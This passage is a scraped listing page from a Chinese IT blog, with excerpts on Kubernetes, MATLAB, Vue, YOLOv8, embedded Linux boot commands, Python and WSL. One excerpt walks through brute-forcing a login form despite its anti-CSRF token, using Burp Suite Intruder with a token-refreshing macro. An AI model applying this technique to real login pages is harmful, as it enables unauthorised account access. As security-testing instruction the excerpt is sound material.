from kubernetes import client, config import time # 加载Kubernetes配置 config.load_kube_config() # 指定节点名称 node_name = "your-node-name" # 获取所有在该节点上的Pod v1 = client.CoreV1Api() pod_list = v1.list_pod_for_all_namespaces(field_selector=f"spec.nodeName={node_name}").items # 重启Pod restart_count = 0 for pod in pod_list: # 重启Pod api_response = v1.delete_namespaced_pod( name=pod.metadata.name, namespace=pod.metadata.namespace, body=client.V1DeleteOptions(propagation_policy='Foreground'), ) # 等待10秒钟后重启下两个Pod restart_count += 1 if restart_count % 2 == 0: print(f"已经重启了{restart_count}个Pod，等待10秒钟...") time.sleep(10) 请将“your-node-name”替换为要重启其上的Pod的节点的名称。然后，只需运行脚本即可开始重启Pod。
以下是一个Shell脚本的示例，它将重启指定 Kubernetes 节点上的所有 Pod，并在每次重启两个 Pod 后等待 10 秒钟再重启下两个 Pod。请确保您已经安装了 Kubernetes 命令行客户端（kubectl）：
#!/bin/bash # 指定节点名称 NODE_NAME="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/062c3ea4a9351cefe70cf2ef463271a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ba03dcf5b4da799f9b609f35e5888bc/" rel="bookmark">
			实验一   图像的显示运算与灰度变
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实验一 图像的显示运算与灰度变换
实验目的
熟悉Matlab图像运算的基础——矩阵运算；
熟悉图像矩阵的显示方法（灰度、彩色）；
熟悉亮度变换函数的使用
熟悉灰度图像的直方图的表示；
掌握图像增强的基本方法：灰度变换、直方图均衡；
实验内容
Matlab图像处理工具箱的初步练习。
练习图像读写命令imread和imwrite等函数进行图像文件显示、存储、运算。
灰度线性变换、灰度直方图、直方图均衡处理；
灰度变换是图像增强的一种重要手段，使图像对比度扩展，图像更加清晰，特征更加明显。灰度级的直方图给出了一幅图像概貌的描述，通过修改灰度直方图来得到图像增强。
实验原理
点击Matlab快捷键图标, 打开Matlab的工作窗(或指令窗)
Matlab的使用方式
①指令行操作之直接交互工作方式;
②使用matlab编程语言之程序设计方式.
交互方式的使用:
在Matlab工作窗中一般输入以下三种指令行:
①命令
②表达式
③赋值语句：变量 = 表达式;
基本命令:
键盘快捷键——上、下箭头的使用
clc %清除指令窗口
clear %从内存中清除变量和函数
clf %清除当前图
cd %改变或显示当前工作目录
基本函数：
矩阵索引
在Matlab中，矩阵可以很方便地用一列被方括号括起并用分号隔开的行向量表示。
例如：&gt;&gt;A = [1 2 3; 4 5 6; 7 8 9]
冒号操作符“：”的使用——枚举
例如：&gt;&gt;B = A(:, 2) %将第二列提取出来，相当于&gt;&gt;B = A(1:3, 2)
实验报告
1. 请自行输入一个矩阵并随意提取行列。
读取图像
imread %将图像读入MATLAB环境，语法为：
imread(‘filename’)
例：&gt;&gt;f = imread('E:\教学课件\医学图像处理\实验讲义\实验一\实验一用图像\lena_gray.bmp') %将图像二维矩阵赋给了二维数组f，单击左侧Workspace窗口，察看二维数组f的值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ba03dcf5b4da799f9b609f35e5888bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e84d6ae350df97f9f161b9286b0b2e3f/" rel="bookmark">
			vue element table 懒加载 根据滚动条滑动动态加载数据 无分页或分页过大 渲染慢问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现思路：先加载一开始会在页面上显示的数据，比如页面能显示20条数据，就先加载20条，剩下的数据监听滚动条，滚动条到底部再加载。
1.在data()中定义三个属性，分别存储数据指针、表格显示的数据和接口中获取的所有数据。
//数据指针 默认19 needle:19, //表格数据 tableData:[], //所有数据 allData:[], 2.从接口获取数据，并添加最初20条到tableData中。
// 所有数据 this.allData = response.rows; // 初始值为19 this.needle=19; this.tableData=[] //判断数据长度有没有20个，有就先添加20个，没有直接获取所有数据 if(this.allData.length&gt;19){ for(let i=0;i&lt;20;i++){ this.tableData[i]=this.allData[i] } }else{ this.tableData=this.allData } 3.定义懒加载函数
lazyLoading(){ //获取table的body元素 let dom = document.querySelector(".el-table__body-wrapper"); console.log('dom',dom) //添加对滚动条的监听 dom.addEventListener("scroll", (v) =&gt; { const scrollDistance = dom.scrollHeight - dom.scrollTop - dom.clientHeight; console.log("鼠标滑动-scrollDistance",scrollDistance) // if (scrollDistance &lt;= 0) { //分辨率问题，如果设置 100% ，滑倒最底部，scrollDistance的值 可能为 0.201 到 -0.201 if (scrollDistance &lt;= 1) { //等于0证明滚动条已经到底 // 一条一条加载记录，直至遍历到最后一条 while(this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e84d6ae350df97f9f161b9286b0b2e3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5258023a8dfcc0c1ae46318bc6ee4c18/" rel="bookmark">
			YOLOV8改进：如何增加注意力模块？（以CBAM模块为例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		YOLOV8改进：如何增加注意力模块？（以CBAM模块为例） 前言YOLOV8nn文件夹modules.pytask.py models文件夹总结 前言 因为毕设用到了YOLO，鉴于最近V8刚出，因此考虑将注意力机制加入到v8中。
YOLOV8 代码地址：YOLOV8官方代码
使用pip安装或者clone到本地，在此不多赘述了。下面以使用pip安装ultralytics包为例介绍。
进入ultralytics文件夹
nn文件夹 再进入nn文件夹。
-- modules.py：在里面存放着各种常用的模块，如：Conv，DWConv，ConvTranspose，TransformerLayer，Bottleneck等 -- tasks.py: 在里面导入了modules中的基本模块组建model，根据不同的下游任务组建不同的model。 modules.py 在该文件中，我们可以写入自己的注意力模块，或者使用V8已经提供的CBAM模块（见代码的CBAM类）
""" 通道注意力模型: 通道维度不变，压缩空间维度。该模块关注输入图片中有意义的信息。 1）假设输入的数据大小是(b,c,w,h) 2）通过自适应平均池化使得输出的大小变为(b,c,1,1) 3）通过2d卷积和sigmod激活函数后，大小是(b,c,1,1) 4）将上一步输出的结果和输入的数据相乘，输出数据大小是(b,c,w,h)。 """ class ChannelAttention(nn.Module): # Channel-attention module https://github.com/open-mmlab/mmdetection/tree/v3.0.0rc1/configs/rtmdet def __init__(self, channels: int) -&gt; None: super().__init__() self.pool = nn.AdaptiveAvgPool2d(1) self.fc = nn.Conv2d(channels, channels, 1, 1, 0, bias=True) self.act = nn.Sigmoid() def forward(self, x: torch.Tensor) -&gt; torch.Tensor: return x * self.act(self.fc(self.pool(x))) """ 空间注意力模块：空间维度不变，压缩通道维度。该模块关注的是目标的位置信息。 1） 假设输入的数据x是(b,c,w,h)，并进行两路处理。 2）其中一路在通道维度上进行求平均值，得到的大小是(b,1,w,h)；另外一路也在通道维度上进行求最大值，得到的大小是(b,1,w,h)。 3） 然后对上述步骤的两路输出进行连接，输出的大小是(b,2,w,h) 4）经过一个二维卷积网络，把输出通道变为1，输出大小是(b,1,w,h) 4）将上一步输出的结果和输入的数据x相乘，最终输出数据大小是(b,c,w,h)。 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5258023a8dfcc0c1ae46318bc6ee4c18/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ac08e765ff58ad4dc023b41e4b7a71f/" rel="bookmark">
			IMX6ULL配置记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		EMMC启动
setenv bootcmd 'mmc dev 1;fatload mmc 1:1 80800000 zImage;fatload mmc 1:1 83000000 imx6ull-14x14-evk.dtb;bootz 80800000 - 83000000'
setenv bootargs 'console=ttymxc0,115200 root=/dev/mmcblk1p2 rootwait rw'
网络启动
setenv bootargs 'console=ttymxc0,115200 root=/dev/nfs nfsroot=192.168.31.53:/home/ros/linux/nfs/rootfs,proto=tcp rw ip=192.168.31.115:192.168.31.53:192.168.31.1:255.255.255.0::eth0:off'
setenv bootcmd 'tftp 80800000 zImage; tftp 83000000 imx6ull-alientek-emmc_mydriver.dtb; bootz 80800000 - 83000000'
make install CONFIG_PREFIX=/home/ros/linux/nfs/rootfs
cp *so* *.a /home/ros/linux/nfs/rootfs/lib/ -d
cp ld-linux-armhf.so.3 /home/ros/linux/nfs/rootfs/lib/
cp *so* *.a /home/ros/linux/nfs/rootfs/lib/ -d
cp *so* *.a /home/ros/linux/nfs/rootfs/usr/lib -d
查看设备树
cd /proc/device-tree/
自己的编译器
/usr/local/arm/gcc-linaro-4.9.4-2017.01-x86_64_arm-linux-gnueabihf/bin
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9ac08e765ff58ad4dc023b41e4b7a71f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17d78cf98918c9008283a1879830eab4/" rel="bookmark">
			抽象工厂模式与工厂模式的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		抽象工厂模式和工厂模式都是创建型模式，它们的主要差别在于抽象工厂模式着重于创建一组相关的对象（即产品家族），而工厂模式则着重于创建单一对象。
在工厂模式中，我们只需关心如何创建一个对象，而不用关心该对象与其他对象之间的关系。我们通过工厂类的静态方法来创建对象，这些静态方法通常只有一两个，并且只接受少量参数。工厂模式常用于创建具有相同接口但实现不同的对象。
在抽象工厂模式中，我们需要创建一组相关的对象（即产品家族），并且这些对象之间存在某些关系，如相互依赖、配合使用等。我们通过创建一个工厂类族来创建对象，每个工厂类负责创建一组相关的对象。与工厂模式不同的是，抽象工厂模式中的工厂类通常涉及多个方法，每个方法用于创建一个不同的对象。抽象工厂模式常用于开发大型系统或框架，其中需要创建多个相关的对象。
总的来说，工厂模式和抽象工厂模式都是用于封装对象的创建过程，使客户端代码与具体类解耦。当需要创建多个相关的对象时，使用抽象工厂模式更为合适；当只需要创建单一对象时，使用工厂模式更为简单方便。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c45c287b72205bf73683ea08b9dfa4c/" rel="bookmark">
			图片经卷积或池化后尺寸大小计算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 卷积 卷积层的作用是提取输入图片中的信息，这些信息被称为图像特征，这些特征是由图像中的每个像素通过组合或者独立的方式所体现，比如图片的纹理特征，颜色特征。
卷积层有很多卷积核，通过做越来越多的卷积，提取到的图像特征会越来越抽象。
# 此方法中有初始化的卷积核，因此只需要指定卷积核大小即可，不需要管其中内容 torch.nn.Conv2d(in_channels, out_channels, kernel_size, stride=1, padding=0, dilation=1, groups=1, bias=True, padding_mode='zeros') in_channels：参数代表输入特征矩阵的深度即channel，比如输入一张RGB彩色图像，那in_channels=3
out_channels：参数代表卷积核的个数，使用n个卷积核输出的特征矩阵深度即channel就是n
kernel_size：参数代表卷积核的尺寸，输入可以是int类型如3，代表卷积核的height=width=3，也可以是tuple类型如(3, 5)代表卷积核的height=3，width=5
stride：参数代表卷积核的步距，默认为1，和kernel_size一样输入可以是int类型，也可以是tuple类型【传入若为(2,3)，即卷积核每次向右移动2格，右边不够位后回到起点向下移动3格重新开始】
padding：参数代表在输入特征矩阵四周补零的情况默认为0【上图👆就在外围补了一圈0】，同样输入可以为int型如1代表上下方向各补一行0元素，左右方向各补一列0像素
如果输入为tuple型如(2, 1)代表在上方补2行下方补2行，左边补1列，右边补1列。padding[0]是在H高度方向两侧填充，padding[1]是在W宽度方向两侧填充
bias：参数表示是否使用偏置，默认使用
其余参数较少使用，此处省略
1.1 张量卷积后的尺寸 在卷积操作过程中，我们知道矩阵经卷积操作后的尺寸由以下👇几个因素决定：
输入图片的大小 W × W W \times W W×W
若大小为 H × W H \times W H×W，则用下边公式👇分别计算得到新的H和W，二者相乘为矩阵尺寸N
卷积核kernel_size大小 K × K K \times K K×K
步长stride大小S
填充padding大小P
矩阵尺寸 N = ⌊ W − K + 2 P S ⌋ + 1 如下代码经过卷积得到的矩阵尺寸为 N = ⌊ 5 − 2 + 2 × 1 2 ⌋ + 1 = 3 矩阵尺寸\ N = \left \lfloor \dfrac{W − K + 2P }{S} \right \rfloor + 1\\ \\ 如下代码经过卷积得到的矩阵尺寸为N = \left \lfloor \dfrac{5 − 2 + 2\times 1 }{2} \right \rfloor + 1=3 矩阵尺寸 N=⌊SW−K+2P​⌋+1如下代码经过卷积得到的矩阵尺寸为N=⌊25−2+2×1​⌋+1=3
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c45c287b72205bf73683ea08b9dfa4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b72bd416298e0996d9b1bf627c6e2093/" rel="bookmark">
			最详细的python安装教程，小白建议收藏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python安装是学习pyhon第一步，很多刚入门小白不清楚如何安装python，今天我来带大家完成python安装与配置，跟着我一步步来，很简单，你肯定能完成。
咱们先一起来看看今天的主要内容： （1）安装Python
（2）编写第一个“Hello Wolrd”程序
下载安装Python有些好奇的宝宝可能会问了，为什么要安装Python呢?其实咱们安装的是“Python解释器”。这个“解释器”就好比同声传译一样，把我们的代码，翻译成计算机能理解的机器语言，这样我们就可以和计算机交流啦。
Python从大的版本上，分为Python2和Python3。这两个版本有很大差异，是不兼容的。
Python2已经于今年（2020 年）1 月 1 日，被官方正式放弃，不再维护更新。所以Python2即将成为文物，新手们学习Python3就可以啦。咱们的教程，就是基于Python3的，一会儿我们会在官网下载最新版本。
苹果原生系统其实自带了一个Python2版本，我们可以在自己的电脑上验证一下。
首先在“应用程序”里面找到“实用工具”，图示如下：
双击“终端”，然后会出现一个“命令行终端窗口”，图示如下 ：
（如果是没有计算机基础的童鞋，我们这里简单说明一下，“命令行终端窗口”，是Mac系统为计算机专业人士提供的，一种和系统交流的工具。）
在命令行终端窗口里面输入“python”命令，然后回车，我们看到这里显示的是“python2.7.16”（“2.x.x”或“3.x.x”，前面的“2”或“3”表示Python2或Python3，后面的“x”表示小优化版本。官网现在最新版本是Python3.8.2）：
那么接下来，我们就去官网下载Python3最新版本吧。 第 1 步 下载Python
打开浏览器。
在百度搜索页输入python关键字进行搜索，点击带有“官方”标识的搜索结果即可进入Python官方主页：
进入Python官方主页：
我们把鼠标放在“Downloads”上，就会出现上图所示的浮层。（如果没有刷出来是网络原因，稍等一会就有了）
我们点击“Python3.8.2”，选择文件存放位置，就可以开始下载啦。下载完成后，我们接下来开始安装。
第 2 步 安装Python
安装的过程也是非常简单，接下来我通过视频的方式给大家进行演示：
中间有一次密码确认的环节，这个密码就是你自己设置的系统开机密码，输入完密码之后，大家只需要“下一步”一直点就可以了。
按照视频操作完成之后，Python3.8.2就已经安装成功了。我们快去测试验证一下。
大家再次打开“命令行终端窗口”，输入“python3”命令，然后回车：
我们看到这里显示了“3.8.2”，说明我们刚才安装成功了。
注意，这里要划重点了：
在Mac系统上，输入“python3”命令才能启动python3，如果按照我们前面那样输入“python”命令的话，默认启动的是python2。
上面这个输入“python3”并回车的操作，意思是在命令行终端窗口里，启动Python3的解释器。
在命令行终端窗口里编写Python程序，我们需要在解释器启动的状态下，才可以编码。所以，每次关闭命令行终端窗口后重新打开，都需要先输入“python3”命令，启动Python3解释器。
我们看到上图红框里的符号“&gt;&gt;&gt;”，这个符号是“编程开始提示符”，意思就是“你可以开始写代码啦”，在这里大家可以记住这个符号。
接下来，让我们在这个“&gt;&gt;&gt;”符号后面，开始编写人生第一个Python程序吧。
一、Python所有方向的学习路线 Python所有方向的技术点做的整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。
二、Python必备开发工具 三、精品Python学习书籍 当我学到一定基础，有自己的理解能力的时候，会去阅读一些前辈整理的书籍或者手写的笔记资料，这些笔记详细记载了他们对一些技术点的理解，这些理解是比较独到，可以学到不一样的思路。
四、Python视频合集 观看零基础学习视频，看视频学习是最快捷也是最有效果的方式，跟着视频中老师的思路，从基础到深入，还是很容易入门的。
五、实战案例 光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
六、Python练习题 检查学习结果。
七、面试资料 我们学习Python必然是为了找到高薪的工作，下面这些面试题是来自阿里、腾讯、字节等一线互联网大厂最新的面试资料，并且有阿里大佬给出了权威的解答，刷完这一套面试资料相信大家都能找到满意的工作。
这份完整版的Python全套学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab96c181fbd28c293502f83e9f8dfa27/" rel="bookmark">
			前端 token-防爆破（CSRF Token Bypass）-burpsuit
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		知识点：利用 burpsuite 循环把前端页面上的 token 值加到登录的 token 上。 前端页面： &lt;form method="POST"&gt; &lt;div class="form-floating mb-3"&gt; &lt;input class="form-control" type="text" name=username placeholder="Username" required&gt; &lt;label for="username"&gt;Username&lt;/label&gt; &lt;/div&gt; &lt;div class="form-floating mb-3"&gt; &lt;input class="form-control" type="password" name=password placeholder="Password" required&gt; &lt;label for="password"&gt;Password&lt;/label&gt; &lt;/div&gt; &lt;input type="hidden" name="loginToken" value="84c6358bbf1bd8000b6b63ab1bd77c5e"&gt; &lt;div class="d-grid"&gt;&lt;button class="btn btn-warning btn-lg" type="submit"&gt;Login!&lt;/button&gt;&lt;/div&gt; &lt;/form&gt; 爆破步骤 捕获请求并将其发送给 Intruder。
攻击类型设置为：Pitchfork。
仅选择用户名和密码表单字段。其他两个位置（session 和 loginToken）将由我们的宏处理。
构建一个宏，允许我们重复执行同一组动作。
在请求历史中选择对应的请求。
添加会话处理规则。
在 Scope 子选项卡中，选择作用范围。
在 Details 子选项卡中设置规则操作。
设置要获取并更新的值，然后点击 ok。
最后规则的样子就是这样
最后载入字典攻击即可。
爆破成功。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a61272d5d1fdde7a2d10685c05f5c39/" rel="bookmark">
			字符串匹配 python
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		字符串匹配是计算机科学中一个重要的问题，也是实际应用中非常常见的问题。在Python中，字符串匹配可以通过正则表达式、字符串方法等方式来实现。本文将介绍Python中字符串匹配的相关知识。
正则表达式 正则表达式是一种用于匹配字符串的模式，可以用来检测一个字符串是否符合某个模式。在Python中，可以使用re模块来操作正则表达式。例如，要匹配一个字符串是否符合邮箱格式，可以使用以下代码：
import re email = 'example@gmail.com' match = re.search(r'^\\w+@[a-zA-Z_]+?\\.[a-zA-Z]{2,3}$', email) if match: print('Valid email address') else: print('Invalid email address') 字符串方法 Python中的字符串方法提供了一些常用的字符串操作，包括字符串查找、替换、分割等。例如，要查找一个字符串中是否包含某个子串，可以使用以下代码：
my_string = 'This is a sample string' if 'sample' in my_string: print('Substring found') else: print('Substring not found') 字符串模板 字符串模板是一种快速生成字符串的方法，可以将一些变量插入到一个字符串中。在Python中，可以使用字符串模板来生成动态的字符串。例如，要生成一个包含变量值的字符串，可以使用以下代码：
from string import Template name = 'John' age = 30 template = Template('My name is $name and I am $age years old.') my_string = template.substitute(name=name, age=age) print(my_string) 总结：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a61272d5d1fdde7a2d10685c05f5c39/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c0fc1af867839b5e61064ee5851b780/" rel="bookmark">
			java.lang.IllegalArgumentException: baseUrl must end in /: http://xxx.xxx.com/cric
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Retrofit2 报错baseUrl must end in / 依赖
// Rxjava implementation 'io.reactivex.rxjava2:rxandroid:2.0.1' implementation 'io.reactivex.rxjava2:rxjava:2.0.5' // retrofit 网络 请求 implementation 'com.squareup.retrofit2:retrofit:2.4.0' // implementation 'com.jakewharton.retrofit:retrofit2-rxjava2-adapter:1.0.0' implementation 'com.squareup.retrofit2:adapter-rxjava2:2.2.0' implementation ('com.squareup.retrofit2:converter-gson:2.7.0'){ exclude group : 'com.google.code.gson' } 现象：
builder.baseUrl(http://xxx.xxx.com/cric); ​或 builder.baseUrl(http://xxx.xxx.com/cric/); ​ @POST("/index.php?m=&amp;c=app&amp;a=sendSMS") Call&lt;ResponseBody&gt; sendSMS2(@Body RequestBody body); 请求时报错现象可能又两种
错误1. baseUrl must end in /: http://xxx.xxx.com/cric
错误2：打印日志显示 的请求路径：http://xxx.xxx.com/index.php?m=&amp;c=app&amp;a=sendSMS.重路径中看到少了 /cric 这个。
解答案决：
// 设置路径最后面带斜杠 “/” builder.baseUrl(http://xxx.xxx.com/cric/); ​ // 接口这里最前面不要带斜杠 “/” @POST("index.php?m=&amp;c=app&amp;a=sendSMS") Call&lt;ResponseBody&gt; sendSMS2(@Body RequestBody body); 详细原因参考：Retrofit2 的baseUrl 真的必须以 /（斜线） 结尾吗？ - 简书 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85c3c201ad72cd411722035cc29ad0a7/" rel="bookmark">
			Windows10使用Linux功能（WSL）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先要按照WSL整个过程需要使用打开 PowerShell，并且用管理员模式打开
如果你版本足够的高在PowerShell中使用如下命令
C:\WINDOWS\system32&gt;wsl --install 我的不是所以要手工，原文是旧版 WSL 的手动安装步骤
步骤 1 - 启用Windows Subsystem For Linux（WSL） C:\WINDOWS\system32&gt;dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart 步骤 2 - 检查是否符合WSL 2 的运行要求 :: 查看Win10版本号 C:\WINDOWS\system32&gt;winver :: 查看配置信息 C:\WINDOWS\system32&gt;wininfo32 :: 查看版本号 C:\WINDOWS\system32&gt;systeminfo | findstr Build OS ??: 10.0.18363 ?? Build 18363 C:\WINDOWS\system32&gt;systeminfo | find "System Type" 对于 x64 系统：版本 1903 或更高版本，内部版本为 18362 或更高版本。对于 ARM64 系统：版本 2004 或更高版本，内部版本为 19041 或更高版本。 如果运行的是 Windows 10 版本1903 或 1909，请在 Windows 菜单中打开“设置”，导航到“更新和安全性”，然后选择“检查更新”。 内部版本号必须是 18362.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/85c3c201ad72cd411722035cc29ad0a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5431bb7488ecb6d3c3f5947714fd8e6c/" rel="bookmark">
			vue3计算属性实现全选
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 &lt;template&gt; &lt;el-checkbox v-model="selectAll" @change="toggleAll"&gt;全选&lt;/el-checkbox&gt; &lt;el-checkbox-group v-model="checkList" @change="headleAdd" v-for="(item, index) in relist" &gt; &lt;/template&gt; &lt;script lang="ts" setup&gt; import { ref } from 'vue' // 全选 const selectAll = computed({ get() { return checkList.value.length === relist.value.length; }, set(value) { checkList.value = value ? relist.value : []; }, }); function toggleAll(event) { checkList.value = event.target.checked ? relist.value : []; } &lt;/script&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc033fd503319cf7eb0be6ef25a5bacd/" rel="bookmark">
			Vue-router 3.x 参数传递看完让你明明白白！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 概述路由传参的两大载体分类声明式路由 【router-link 】编程式路由 【this.$router.push()】 传参的方式1. 通过 params 传递参数配置路由参数字段占位（编程式路由实现）配置路由参数字段占位（声明式路由实现）无需配置路由参数字段占位（编程式路由实现）无需配置路由参数字段占位（声明式路由实现） 2. 通过 query 传递参数通过router-link 传递 query 参数通过 编程式路由 传递 query 参数 3.使用 props 属性代理传递参数补充点 概述 Vue- routrer，页面路由跳转时，携带参数传递 并拿取传递过来的参数，本文将详细讲解 Vue router传递参数的多种方式；
如果你还不了解 Vuerouter 基本使用及配置请通过下面传送门，了解vue router 路由的基本配置及使用
传送门去了解 Vue-router
路由传参的两大载体分类 声明式路由 【router-link 】 编程式路由 【this.$router.push()】 传参的方式 1. 通过 params 传递参数 params参数传递也有两种方式：第一种就是在路由路径 path 后面 添加接收参数的字段占位传参，第二种 就是不需要配置占位字段也能传参
配置路由参数字段占位（编程式路由实现） //路由中配置 { path: '/datapage/:id', //若id后面加?代表这个参数是可选非必传的，即使不传id也不会导致页面无法访问 name: 'datapage', component: datapage, children: [], }, //页面中跳转 this.$router.push({ path: `/datapage/${"参数"}`, //如果要是用 path 传参 必须使用字符串模板 }); //或 this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc033fd503319cf7eb0be6ef25a5bacd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ecafe34f86ef82b165da8911c030fb3/" rel="bookmark">
			微信小程序任意指定页面生成二维码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在日常微信小程序运营中，文章，和朋友圈海报内总会用到微信小程序特定页面二维码
第一步：登录微信公众平台https://mp.weixin.qq.com/ 第二步：点击右上角工具-》生成小程序码 第三步：将鼠标放置“获取更多页面路径”，在弹窗内输入自己的微信号，点击开启 ps:一定要输入当前小程序小程序项目成员的微信号
第四步：开启成功后，已开启微信用户可打开小程序右上角菜单，点击“复制页面路径”并粘贴至左侧“小程序页面路径”中 第五步：复制到“pages/project/index/index.html”页面链接直接输入进“小程序页面路径”内点击确认即可 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/93/">«</a>
	<span class="pagination__item pagination__item--current">94/279</span>
	<a class="pagination__item pagination__item--next btn" href="/page/95/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>